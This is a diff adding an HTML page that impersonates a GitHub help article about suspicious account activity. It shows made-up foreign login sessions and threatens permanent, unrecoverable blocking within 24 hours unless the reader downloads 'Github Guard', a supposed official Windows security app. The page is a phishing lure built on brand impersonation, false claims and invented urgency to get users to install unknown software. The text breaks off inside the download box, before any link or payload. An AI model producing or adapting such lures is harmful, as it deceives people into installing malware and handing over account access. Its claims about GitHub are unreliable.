@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Account Security Alert · Github Help</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --color-canvas-default: #ffffff;
+      --color-canvas-subtle: #f6f8fa;
+      --color-border-default: #d0d7de;
+      --color-border-muted: #d8dee4;
+      --color-neutral-muted: rgba(175,184,193,0.2);
+      --color-fg-default: #1f2328;
+      --color-fg-muted: #636c76;
+      --color-fg-subtle: #6e7781;
+      --color-accent-fg: #0969da;
+      --color-accent-emphasis: #0969da;
+      --color-danger-fg: #d1242f;
+      --color-danger-subtle: #ffebe9;
+      --color-danger-muted: rgba(255,129,130,0.4);
+      --color-attention-fg: #9a6700;
+      --color-attention-subtle: #fff8c5;
+      --color-attention-muted: rgba(212,167,44,0.4);
+      --color-success-fg: #1a7f37;
+      --color-success-subtle: #dafbe1;
+      --color-success-muted: rgba(74,194,107,0.4);
+      --color-done-fg: #8250df;
+      --color-done-subtle: #fbefff;
+      --color-btn-bg: #f6f8fa;
+      --color-btn-border: rgba(31,35,40,0.15);
+      --color-btn-primary-bg: #1f883d;
+      --color-btn-primary-hover: #1a7f37;
+      --color-btn-primary-border: rgba(31,35,40,0.15);
+      --color-header-bg: #24292f;
+      --shadow-resting: 0 1px 0 rgba(31,35,40,0.04);
+      --shadow-floating: 0 8px 24px rgba(140,149,159,0.2);
+      --base-size-4: 4px;
+      --base-size-8: 8px;
+      --base-size-12: 12px;
+      --base-size-16: 16px;
+      --base-size-24: 24px;
+      --base-size-32: 32px;
+      --borderRadius-medium: 6px;
+      --borderRadius-large: 8px;
+    }
+
+    html { font-size: 16px; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans",
+                   Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      line-height: 1.5;
+      color: var(--color-fg-default);
+      background: var(--color-canvas-default);
+      min-height: 100vh;
+    }
+
+    a {
+      color: var(--color-accent-fg);
+      text-decoration: none;
+    }
+    a:hover { text-decoration: underline; }
+
+    /* ── Header ───────────────────────────────────────────────── */
+    .gh-header {
+      background: var(--color-header-bg);
+      padding: 0 32px;
+      height: 62px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .gh-header-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      color: #fff;
+      font-weight: 600;
+      font-size: 16px;
+    }
+    .gh-header-logo svg {
+      fill: #fff;
+      flex-shrink: 0;
+    }
+    .gh-header-sep {
+      color: rgba(255,255,255,.3);
+      font-size: 20px;
+      font-weight: 200;
+      line-height: 1;
+    }
+    .gh-header-section {
+      color: rgba(255,255,255,.7);
+      font-size: 14px;
+    }
+    .gh-header-section a {
+      color: rgba(255,255,255,.7);
+      text-decoration: none;
+    }
+    .gh-header-section a:hover { color: #fff; text-decoration: none; }
+
+    /* ── Layout ───────────────────────────────────────────────── */
+    .layout-container {
+      max-width: 1012px;
+      margin: 0 auto;
+      padding: 0 32px;
+    }
+
+    /* ── Breadcrumb ───────────────────────────────────────────── */
+    .breadcrumb {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 16px 0 0;
+      font-size: 13px;
+      color: var(--color-fg-muted);
+    }
+    .breadcrumb a { color: var(--color-fg-muted); }
+    .breadcrumb a:hover { color: var(--color-accent-fg); }
+    .breadcrumb-sep { color: var(--color-border-default); }
+
+    /* ── Page layout: sidebar + content ──────────────────────── */
+    .page-layout {
+      display: flex;
+      gap: 40px;
+      padding: 24px 0 64px;
+      align-items: flex-start;
+    }
+
+    /* ── Sidebar ──────────────────────────────────────────────── */
+    .sidebar {
+      width: 220px;
+      flex-shrink: 0;
+      position: sticky;
+      top: 78px;
+    }
+    .sidebar-heading {
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: .5px;
+      color: var(--color-fg-muted);
+      padding: 8px 0;
+      margin-bottom: 4px;
+    }
+    .sidebar-nav {
+      list-style: none;
+      border-left: 2px solid var(--color-border-muted);
+    }
+    .sidebar-nav li a {
+      display: block;
+      padding: 5px 12px;
+      font-size: 13px;
+      color: var(--color-fg-muted);
+      text-decoration: none;
+      border-left: 2px solid transparent;
+      margin-left: -2px;
+      border-radius: 0;
+      transition: color .12s, border-color .12s;
+    }
+    .sidebar-nav li a:hover {
+      color: var(--color-fg-default);
+      text-decoration: none;
+    }
+    .sidebar-nav li a.active {
+      color: var(--color-fg-default);
+      border-left-color: var(--color-fg-default);
+      font-weight: 600;
+    }
+
+    /* ── Main Content ─────────────────────────────────────────── */
+    .content {
+      flex: 1;
+      min-width: 0;
+    }
+
+    /* Page title */
+    .page-title {
+      font-size: 28px;
+      font-weight: 600;
+      line-height: 1.25;
+      color: var(--color-fg-default);
+      padding-bottom: 8px;
+      border-bottom: 1px solid var(--color-border-default);
+      margin-bottom: 24px;
+    }
+
+    /* ── Alert banners ────────────────────────────────────────── */
+    .flash {
+      padding: 12px 16px;
+      border-radius: var(--borderRadius-medium);
+      border: 1px solid;
+      margin-bottom: 16px;
+      font-size: 14px;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      line-height: 1.5;
+    }
+    .flash svg { flex-shrink: 0; margin-top: 1px; }
+    .flash-body { flex: 1; }
+    .flash-body p { margin: 0; }
+    .flash-body p + p { margin-top: 6px; }
+    .flash-title {
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+
+    .flash-danger {
+      background: var(--color-danger-subtle);
+      border-color: var(--color-danger-muted);
+      color: var(--color-danger-fg);
+    }
+    .flash-danger .flash-body { color: #82071e; }
+    .flash-danger .flash-title { color: var(--color-danger-fg); }
+
+    .flash-warning {
+      background: var(--color-attention-subtle);
+      border-color: var(--color-attention-muted);
+      color: var(--color-attention-fg);
+    }
+    .flash-warning .flash-body { color: #633c01; }
+    .flash-warning .flash-title { color: var(--color-attention-fg); }
+
+    .flash-success {
+      background: var(--color-success-subtle);
+      border-color: var(--color-success-muted);
+      color: var(--color-success-fg);
+    }
+    .flash-success .flash-body { color: #0a3622; }
+
+    .flash-accent {
+      background: #ddf4ff;
+      border-color: rgba(84,174,255,.4);
+      color: #0550ae;
+    }
+    .flash-accent .flash-body { color: #0c3b6e; }
+
+    /* ── Section headings ─────────────────────────────────────── */
+    .content h2 {
+      font-size: 20px;
+      font-weight: 600;
+      line-height: 1.25;
+      margin: 32px 0 12px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid var(--color-border-default);
+      color: var(--color-fg-default);
+    }
+    .content h2:first-of-type { margin-top: 0; }
+
+    .content h3 {
+      font-size: 16px;
+      font-weight: 600;
+      margin: 20px 0 8px;
+      color: var(--color-fg-default);
+    }
+
+    .content p {
+      margin-bottom: 12px;
+      color: var(--color-fg-default);
+    }
+
+    .content ul, .content ol {
+      padding-left: 24px;
+      margin-bottom: 12px;
+    }
+    .content li {
+      margin-bottom: 4px;
+      color: var(--color-fg-default);
+    }
+    .content li + li { margin-top: 6px; }
+
+    /* ── Box / Card ───────────────────────────────────────────── */
+    .box {
+      border: 1px solid var(--color-border-default);
+      border-radius: var(--borderRadius-large);
+      background: var(--color-canvas-default);
+      margin-bottom: 20px;
+      overflow: hidden;
+    }
+    .box-header {
+      padding: 12px 16px;
+      background: var(--color-canvas-subtle);
+      border-bottom: 1px solid var(--color-border-default);
+      font-size: 14px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--color-fg-default);
+    }
+    .box-body {
+      padding: 16px;
+    }
+    .box-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      border-bottom: 1px solid var(--color-border-muted);
+      font-size: 13px;
+      gap: 12px;
+    }
+    .box-row:last-child { border-bottom: none; }
+    .box-row-label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--color-fg-muted);
+    }
+    .box-row-value {
+      font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas,
+                   "Liberation Mono", monospace;
+      font-size: 12px;
+      color: var(--color-fg-default);
+    }
+
+    /* ── Labels / Badges ──────────────────────────────────────── */
+    .Label {
+      display: inline-flex;
+      align-items: center;
+      padding: 0 7px;
+      font-size: 12px;
+      font-weight: 500;
+      line-height: 20px;
+      border-radius: 999px;
+      border: 1px solid transparent;
+      white-space: nowrap;
+    }
+    .Label--danger {
+      background: var(--color-danger-subtle);
+      border-color: var(--color-danger-muted);
+      color: var(--color-danger-fg);
+    }
+    .Label--warning {
+      background: var(--color-attention-subtle);
+      border-color: var(--color-attention-muted);
+      color: var(--color-attention-fg);
+    }
+    .Label--success {
+      background: var(--color-success-subtle);
+      border-color: var(--color-success-muted);
+      color: var(--color-success-fg);
+    }
+    .Label--accent {
+      background: #ddf4ff;
+      border-color: rgba(84,174,255,.4);
+      color: #0550ae;
+    }
+    .Label--done {
+      background: var(--color-done-subtle);
+      border-color: rgba(194,151,255,.4);
+      color: var(--color-done-fg);
+    }
+
+    /* ── Octicon-style inline icons (SVG) ─────────────────────── */
+    .octicon {
+      display: inline-block;
+      overflow: visible;
+      vertical-align: text-bottom;
+      fill: currentColor;
+    }
+
+    /* ── Steps ────────────────────────────────────────────────── */
+    .steps {
+      list-style: none;
+      padding: 0;
+      margin-bottom: 16px;
+      counter-reset: step-counter;
+    }
+    .steps li {
+      counter-increment: step-counter;
+      display: flex;
+      gap: 14px;
+      margin-bottom: 16px;
+      align-items: flex-start;
+    }
+    .steps li::before {
+      content: counter(step-counter);
+      flex-shrink: 0;
+      width: 26px;
+      height: 26px;
+      background: var(--color-accent-emphasis);
+      color: #fff;
+      border-radius: 50%;
+      font-size: 12px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 1px;
+    }
+    .steps li div { flex: 1; padding-top: 3px; }
+    .steps li strong { display: block; margin-bottom: 2px; }
+    .steps li span { color: var(--color-fg-muted); font-size: 13px; }
+
+    /* ── Download CTA box ─────────────────────────────────────── */
+    .download-box {
+      border: 1px solid var(--color-border-default);
+      border-radius: var(--borderRadius-large);
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+    .download-box-header {
+      background: var(--color-canvas-subtle);
+      border-bottom: 1px solid var(--color-border-default);
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .download-box-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--color-canvas-default);
+      border: 1px solid var(--color-border-default);
+      border-radius: var(--borderRadius-medium);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      flex-shrink: 0;
+    }
+    .download-box-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--color-fg-default);
+    }
+    .download-box-sub {
+      font-size: 12px;
+      color: var(--color-fg-muted);
+      margin-top: 1px;
+    }
+    .download-box-body {
+      padding: 16px;
+    }
+    .download-box-meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin-bottom: 14px;
+    }
+    .download-box-meta-item {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 12px;
+      color: var(--color-fg-muted);
+    }
+
+    /* ── Buttons ──────────────────────────────────────────────── */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding: 5px 16px;
+      font-size: 14px;
+      font-weight: 500;
+      line-height: 20px;
+      border-radius: var(--borderRadius-medium);
+      border: 1px solid;
+      cursor: pointer;
+      text-decoration: none;
+      transition: background .12s, border-color .12s;
+      white-space: nowrap;
+      font-family: inherit;
+    }
+    .btn:hover { text-decoration: none; }
+
+    .btn-default {
+      background: var(--color-btn-bg);
+      border-color: var(--color-btn-border);
+      color: var(--color-fg-default);
+      box-shadow: var(--shadow-resting);
+    }
+    .btn-default:hover {
+      background: #f3f4f6;
+      border-color: rgba(31,35,40,.2);
+    }
+
+    .btn-primary {
+      background: var(--color-btn-primary-bg);
+      border-color: var(--color-btn-primary-border);
+      color: #fff;
+      box-shadow: var(--shadow-resting);
+    }
+    .btn-primary:hover {
+      background: var(--color-btn-primary-hover);
+      color: #fff;
+    }
+
+    .btn-danger {
+      background: #d1242f;
+      border-color: rgba(31,35,40,.15);
+      color: #fff;
+      box-shadow: var(--shadow-resting);
+    }
+    .btn-danger:hover { background: #b91c1c; color: #fff; }
+
+    .btn-large {
+      padding: 8px 20px;
+      font-size: 16px;
+      line-height: 24px;
+    }
+
+    /* ── Callout ──────────────────────────────────────────────── */
+    .callout {
+      border-left: 4px solid;
+      padding: 12px 16px;
+      border-radius: 0 var(--borderRadius-medium) var(--borderRadius-medium) 0;
+      margin-bottom: 16px;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+    .callout-note {
+      border-color: var(--color-accent-emphasis);
+      background: #f0f6ff;
+      color: #0c3b6e;
+    }
+    .callout-warning {
+      border-color: #d4a72c;
+      background: var(--color-attention-subtle);
+      color: #633c01;
+    }
+    .callout-danger {
+      border-color: var(--color-danger-fg);
+      background: var(--color-danger-subtle);
+      color: #82071e;
+    }
+    .callout strong { color: inherit; }
+
+    /* ── Activity Table ───────────────────────────────────────── */
+    .data-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+    .data-table th {
+      text-align: left;
+      padding: 8px 12px;
+      background: var(--color-canvas-subtle);
+      border-bottom: 1px solid var(--color-border-default);
+      font-weight: 600;
+      color: var(--color-fg-muted);
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: .4px;
+    }
+    .data-table th:first-child { border-radius: 6px 0 0 0; }
+    .data-table th:last-child  { border-radius: 0 6px 0 0; }
+    .data-table td {
+      padding: 9px 12px;
+      border-bottom: 1px solid var(--color-border-muted);
+      color: var(--color-fg-default);
+      vertical-align: middle;
+    }
+    .data-table tr:last-child td { border-bottom: none; }
+    .data-table tr:hover td { background: var(--color-canvas-subtle); }
+    .data-table td.mono {
+      font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo,
+                   Consolas, monospace;
+      font-size: 12px;
+      color: var(--color-fg-muted);
+    }
+
+    /* ── Feature list ─────────────────────────────────────────── */
+    .feature-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .feature-list li {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      padding: 6px 0;
+      font-size: 13px;
+      color: var(--color-fg-default);
+      border-bottom: 1px solid var(--color-border-muted);
+    }
+    .feature-list li:last-child { border-bottom: none; }
+    .feature-list .check {
+      color: var(--color-success-fg);
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    /* ── Divider ──────────────────────────────────────────────── */
+    hr {
+      border: none;
+      border-top: 1px solid var(--color-border-default);
+      margin: 24px 0;
+    }
+
+    /* ── Footer ───────────────────────────────────────────────── */
+    .site-footer {
+      background: var(--color-canvas-subtle);
+      border-top: 1px solid var(--color-border-default);
+      padding: 32px;
+    }
+    .footer-inner {
+      max-width: 1012px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      flex-wrap: wrap;
+      gap: 24px;
+    }
+    .footer-brand {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      color: var(--color-fg-muted);
+    }
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px 20px;
+      list-style: none;
+    }
+    .footer-links a {
+      font-size: 12px;
+      color: var(--color-fg-muted);
+    }
+    .footer-links a:hover { color: var(--color-accent-fg); }
+
+    /* ── Responsive ───────────────────────────────────────────── */
+    @media (max-width: 768px) {
+      .layout-container { padding: 0 16px; }
+      .gh-header { padding: 0 16px; }
+      .page-layout { flex-direction: column; gap: 0; }
+      .sidebar { width: 100%; position: static; margin-bottom: 24px; }
+      .sidebar-nav { border-left: none; border-top: 1px solid var(--color-border-muted); border-bottom: 1px solid var(--color-border-muted); display: flex; flex-wrap: wrap; gap: 0; }
+      .sidebar-nav li a { border-left: none; border-bottom: 2px solid transparent; padding: 8px 12px; }
+      .sidebar-nav li a.active { border-left-color: transparent; border-bottom-color: var(--color-fg-default); }
+      .site-footer { padding: 24px 16px; }
+      .data-table { font-size: 12px; }
+      .data-table th, .data-table td { padding: 7px 8px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ── Header ────────────────────────────────────────────────── -->
+<header class="gh-header">
+  <a class="gh-header-logo" href="https://Github.com">
+    <!-- Github wordmark / logo -->
+    <svg height="24" viewBox="0 0 32 32" width="24" aria-hidden="true">
+      <rect width="32" height="32" rx="6" fill="#2ea043"/>
+      <path d="M8 10h10a6 6 0 0 1 0 12H8V10zm4 4v4h6a2 2 0 0 0 0-4h-6z" fill="#fff"/>
+    </svg>
+    Github
+  </a>
+  <span class="gh-header-sep" aria-hidden="true">/</span>
+  <span class="gh-header-section">
+    <a href="https://Github.com/help">Help</a>
+  </span>
+</header>
+
+<!-- ── Main ──────────────────────────────────────────────────── -->
+<div class="layout-container">
+  <nav class="breadcrumb" aria-label="Breadcrumb">
+    <a href="https://Github.com">Github</a>
+    <span class="breadcrumb-sep" aria-hidden="true">›</span>
+    <a href="https://Github.com/help">Help</a>
+    <span class="breadcrumb-sep" aria-hidden="true">›</span>
+    <a href="https://Github.com/help/security">Account Security</a>
+    <span class="breadcrumb-sep" aria-hidden="true">›</span>
+    <span>Suspicious Activity &amp; Account Protection</span>
+  </nav>
+
+  <div class="page-layout">
+
+    <!-- ── Sidebar ─────────────────────────────────────────────── -->
+    <aside class="sidebar" aria-label="Page sections">
+      <div class="sidebar-heading">On this page</div>
+      <ul class="sidebar-nav" id="sidebar-nav">
+        <li><a href="#what-happened" class="active">What happened</a></li>
+        <li><a href="#why-flagged">Why your account was flagged</a></li>
+        <li><a href="#flagged-activity">Flagged activity</a></li>
+        <li><a href="#what-to-do">What you need to do</a></li>
+        <li><a href="#Github-guard">Download Github Guard</a></li>
+        <li><a href="#after-install">After installation</a></li>
+        <li><a href="#if-blocked">If your account is blocked</a></li>
+        <li><a href="#contact">Contact support</a></li>
+      </ul>
+    </aside>
+
+    <!-- ── Content ─────────────────────────────────────────────── -->
+    <main class="content" id="main-content">
+
+      <h1 class="page-title">Suspicious Activity &amp; Account Protection</h1>
+
+      <!-- Top danger flash -->
+      <div class="flash flash-danger" role="alert">
+        <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true">
+          <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"/>
+        </svg>
+        <div class="flash-body">
+          <p class="flash-title">Action required — your account may be blocked</p>
+          <p>Our AI security system has detected suspicious login and sign-in activity on your account.
+             If no action is taken, your account will be automatically blocked to protect your
+             organization and linked services.</p>
+        </div>
+      </div>
+
+      <!-- ── Section 1: What happened ──────────────────────────── -->
+      <h2 id="what-happened">What happened</h2>
+      <p>
+        Github continuously monitors account activity using an AI-powered security engine. Recently,
+        several login attempts and sign-in events associated with your account were identified as
+        potentially unauthorized. These events did not match your normal usage patterns in terms of
+        location, device, or timing.
+      </p>
+      <p>
+        As a precautionary measure — and to comply with Github's organization security policy (similar
+        to how enterprise platforms like Microsoft protect developer accounts) — accounts flagged as
+        compromised are scheduled for automatic blocking until identity can be verified.
+      </p>
+
+      <div class="callout callout-note">
+        <strong>Note:</strong> This process is automatic and is not a punishment. It is a protective
+        measure to prevent unauthorized parties from accessing your account or your organization's data.
+      </div>
+
+      <!-- ── Section 2: Why flagged ──────────────────────────────── -->
+      <h2 id="why-flagged">Why your account was flagged</h2>
+      <p>The Github AI security system flags accounts when one or more of the following anomalies are detected:</p>
+
+      <div class="box">
+        <div class="box-header">
+          <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true">
+            <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm7-3.25v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5a.75.75 0 0 1 1.5 0Z"/>
+          </svg>
+          Anomalies detected by our system
+        </div>
+        <div class="box-row">
+          <span class="box-row-label">
+            <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" style="color:var(--color-fg-muted)">
+              <path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 2 2 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a2 2 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 2 2 0 0 0-2.83 0l-2.5 2.5a2.002 2.002 0 0 0 0 2.83Z"/>
+            </svg>
+            Sign-in from an unrecognized location
+          </span>
+          <span class="Label Label--warning">Suspicious</span>
+        </div>
+        <div class="box-row">
+          <span class="box-row-label">
+            <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" style="color:var(--color-fg-muted)">
+              <path d="M0 2.75C0 1.784.784 1 1.75 1h12.5c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 14.25 12H9.06l.038.827A1.75 1.75 0 0 1 7.354 14.5H7.25a.75.75 0 0 1 0-1.5h.104a.25.25 0 0 0 .249-.233L7.741 12H1.75A1.75 1.75 0 0 1 0 10.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"/>
+            </svg>
+            Login from an unknown or new device
+          </span>
+          <span class="Label Label--warning">Suspicious</span>
+        </div>
+        <div class="box-row">
+          <span class="box-row-label">
+            <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" style="color:var(--color-fg-muted)">
+              <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm7-3.25v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5a.75.75 0 0 1 1.5 0Z"/>
+            </svg>
+            Multiple failed authentication attempts
+          </span>
+          <span class="Label Label--danger">High Risk</span>
+        </div>
+        <div class="box-row">
+          <span class="box-row-label">
+            <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" style="color:var(--color-fg-muted)">
+              <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm7-3.25v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5a.75.75 0 0 1 1.5 0Z"/>
+            </svg>
+            Sign-in at an unusual time outside your normal pattern
+          </span>
+          <span class="Label Label--warning">Suspicious</span>
+        </div>
+        <div class="box-row">
+          <span class="box-row-label">
+            <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" style="color:var(--color-fg-muted)">
+              <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm7-3.25v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5a.75.75 0 0 1 1.5 0Z"/>
+            </svg>
+            IP address associated with a proxy or VPN service
+          </span>
+          <span class="Label Label--accent">Flagged</span>
+        </div>
+      </div>
+
+      <!-- ── Section 3: Flagged activity ───────────────────────── -->
+      <h2 id="flagged-activity">Flagged activity on your account</h2>
+      <p>
+        The following sessions were identified as suspicious and are the reason your account has been
+        placed under a security hold. You can review and manage active sessions after verifying your
+        identity through Github Guard.
+      </p>
+
+      <div class="box">
+        <div class="box-header">
+          <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true">
+            <path d="M9.504.43a1.516 1.516 0 0 1 2.437 1.713L10.415 5.5h2.123c1.57 0 2.346 1.909 1.22 3.004l-7.34 7.142a1.249 1.249 0 0 1-.871.354H4.823a1.75 1.75 0 0 1-1.75-1.75V12.12a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 0 0-1.5h-2.5A2.25 2.25 0 0 0 1.573 12.12v2.13A3.25 3.25 0 0 0 4.823 17.5h.724c.69 0 1.35-.274 1.835-.763l7.34-7.142C16.559 7.82 15.36 5.5 12.538 5.5H11.85l1.113-3.267A3.016 3.016 0 0 0 9.504.43Z"/>
+          </svg>
+          Recent suspicious sessions
+        </div>
+        <table class="data-table" aria-label="Suspicious login sessions">
+          <thead>
+            <tr>
+              <th>IP Address</th>
+              <th>Location</th>
+              <th>Event</th>
+              <th>Time</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="mono">195.91.204.xx</td>
+              <td>Moscow, Russia</td>
+              <td>Sign-in attempt</td>
+              <td style="color:var(--color-fg-muted);font-size:12px;">~2 hours ago</td>
+              <td><span class="Label Label--danger">Suspicious</span></td>
+            </tr>
+            <tr>
+              <td class="mono">103.45.67.xx</td>
+              <td>Beijing, China</td>
+              <td>Password reset request</td>
+              <td style="color:var(--color-fg-muted);font-size:12px;">~5 hours ago</td>
+              <td><span class="Label Label--danger">Suspicious</span></td>
+            </tr>
+            <tr>
+              <td class="mono">91.108.4.xx</td>
+              <td>Frankfurt, Germany</td>
+              <td>New device login</td>
+              <td style="color:var(--color-fg-muted);font-size:12px;">~11 hours ago</td>
+              <td><span class="Label Label--warning">Unusual</span></td>
+            </tr>
+            <tr>
+              <td class="mono">—</td>
+              <td>Your location</td>
+              <td>Current session</td>
+              <td style="color:var(--color-fg-muted);font-size:12px;">Now</td>
+              <td><span class="Label Label--success">Verified</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout callout-warning">
+        <strong>Important:</strong> The IP addresses shown above are partially masked for privacy.
+        Full details, including device fingerprints and session tokens, are available inside Github Guard
+        after you complete identity verification.
+      </div>
+
+      <!-- ── Section 4: What to do ──────────────────────────────── -->
+      <h2 id="what-to-do">What you need to do</h2>
+      <p>
+        To prevent your account from being blocked and to secure it against the detected threats,
+        you must verify your identity using <strong>Github Guard</strong> — the official Github desktop
+        security application for Windows.
+      </p>
+
+      <div class="flash flash-warning">
+        <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true">
+          <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"/>
+        </svg>
+        <div class="flash-body">
+          <p class="flash-title">You must act within 24 hours</p>
+          <p>If you do not complete identity verification before the deadline, your account will be
+             automatically and permanently blocked. Blocked accounts <strong>cannot be recovered</strong> and
+             organization access will be permanently revoked.</p>
+        </div>
+      </div>
+
+      <!-- ── Section 5: Github Guard ──────────────────────────────── -->
+      <h2 id="Github-guard">Download Github Guard</h2>
+      <p>
+        <strong>Github Guard</strong> is the official Github desktop application for Windows. It lets you
+        verify your identity, review and revoke suspicious sessions, set up two-factor authentication,
+        and monitor your account security in real time — all from your Windows taskbar.
+      </p>
+
+      <div class="download-box">
+        <div class="download-box-header">
+          <div class="download-box-icon" aria-hidden="true">🛡️</div>
+          <div>
+            <div class="download-box-title">Github Guard</div>
+            <div class="download-box-sub">Official account security app by Github &nbsp;·&nbsp; Early Access</div>
+          </div>
+          <span class="Label Label--done" style="margin-left:auto">Windows</span>
+        </div>
+        <div class="download-box-body">
+          <div class="download-box-meta">
+            <span class="download-box-meta-item">
+              <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true">
